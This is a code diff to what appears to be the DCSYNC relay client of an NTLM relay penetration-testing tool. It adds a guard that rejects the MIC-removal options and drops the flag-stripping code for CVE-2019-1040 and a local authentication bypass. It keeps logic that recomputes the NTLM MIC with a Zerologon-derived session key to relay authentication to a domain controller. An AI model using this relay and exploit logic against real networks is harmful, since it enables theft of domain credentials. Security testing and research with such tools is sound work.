@@ -193,6 +193,16 @@ class DCSYNCRelayClient(ProtocolClient):
         else:
             auth_data = authenticateMessageBlob
 
+        authenticateMessage = NTLMAuthChallengeResponse()
+        authenticateMessage.fromString(auth_data)
+
+        # IMPORTANT: DCSYNC requires signing/sealing for RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+        # --remove-mic-partial is fundamentally incompatible with DCSYNC's requirements
+        if self.serverConfig.remove_mic or self.serverConfig.remove_mic_partial:
+            LOG.error("DCSYNC relay requires signing/sealing and is incompatible with --remove-mic/--remove-mic-partial")
+            LOG.error("Use LDAPS target instead: -t ldaps://%s" % self.target.netloc)
+            return None, STATUS_ACCESS_DENIED
+
         remoteOps = None
         try:
             signingkey = self.netlogonSessionKey(serverChallenge, authenticateMessageBlob)
@@ -200,38 +210,13 @@ class DCSYNCRelayClient(ProtocolClient):
             if signingkey == 0:
                 return
             self.session.set_session_key(signingkey)
-            authenticateMessage = NTLMAuthChallengeResponse()
-            authenticateMessage.fromString(auth_data)
 
-            # When exploiting CVE-2019-1040, remove flags and zero out MIC/Version
-            if self.serverConfig.remove_mic:
-                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
-                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
-                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
-                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
-                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
-                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
-                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
-                authenticateMessage['MIC'] = b''
-                authenticateMessage['MICLen'] = 0
-                authenticateMessage['Version'] = b''
-                authenticateMessage['VersionLen'] = 0
-            # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
-            elif self.serverConfig.remove_mic_partial:
-                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
-                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
-                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
-                    authenticateMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
-                # Do NOT remove KEY_EXCH or VERSION flags
-                # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
-            else:
-                # Normal DCSYNC path: Recalc MIC with session key from Zerologon
-                authenticateMessage['MIC'] = b'\x00' * 16
-                if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == 0:
-                    authenticateMessage['flags'] |= NTLMSSP_NEGOTIATE_SEAL
-                newmic = ntlm.hmac_md5(signingkey, self.negotiateMessage + self.challenge.getData() + authenticateMessage.getData())
-                authenticateMessage['MIC'] = newmic
+            # Normal DCSYNC path: Recalc MIC with session key from Zerologon
+            authenticateMessage['MIC'] = b'\x00' * 16
+            if authenticateMessage['flags'] & NTLMSSP_NEGOTIATE_SEAL == 0:
+                authenticateMessage['flags'] |= NTLMSSP_NEGOTIATE_SEAL
+            newmic = ntlm.hmac_md5(signingkey, self.negotiateMessage + self.challenge.getData() + authenticateMessage.getData())
+            authenticateMessage['MIC'] = newmic
 
             self.session.sendBindType3(authenticateMessage.getData())
 
